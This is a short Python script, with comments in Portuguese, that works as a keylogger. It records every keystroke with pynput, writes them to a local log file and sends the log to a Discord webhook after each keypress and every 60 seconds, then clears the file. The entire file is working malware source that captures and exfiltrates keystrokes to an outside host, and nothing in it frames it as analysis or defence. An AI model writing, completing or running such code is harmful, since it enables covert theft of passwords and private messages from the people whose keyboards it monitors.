from pynput import keyboard
import requests
import os
import platform
import logging
import time

log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s')

# URL do webhook do discord
discord_webhook_URL = "WebHook"

def on_press(key):
    try:
        logging.info(f"{key.char}")
    except AttributeError:
        logging.info(f"[{key}]")
    
    send_data_to_discord()

def send_data_to_discord():
    if os.path.getsize(log_file) > 0:
        with open(log_file, "r") as file:
            data = file.read()
        try:
            # Envia os dados para o webhook do Discord
            response = requests.post(discord_webhook_URL, json={"content": data})
            if response.status_code == 204:
                open(log_file, "w").close()
        except requests.RequestException as e:
            print(f"Erro ao enviar dados para o Discord: {e}")

def periodic_data_send():
    while True:
        time.sleep(60)
        send_data_to_discord()

if __name__ == "__main__":
    with keyboard.Listener(on_press=on_press) as listener:
        import threading
        thread = threading.Thread(target=periodic_data_send)
        thread.daemon = True
        thread.start()
        
        listener.join()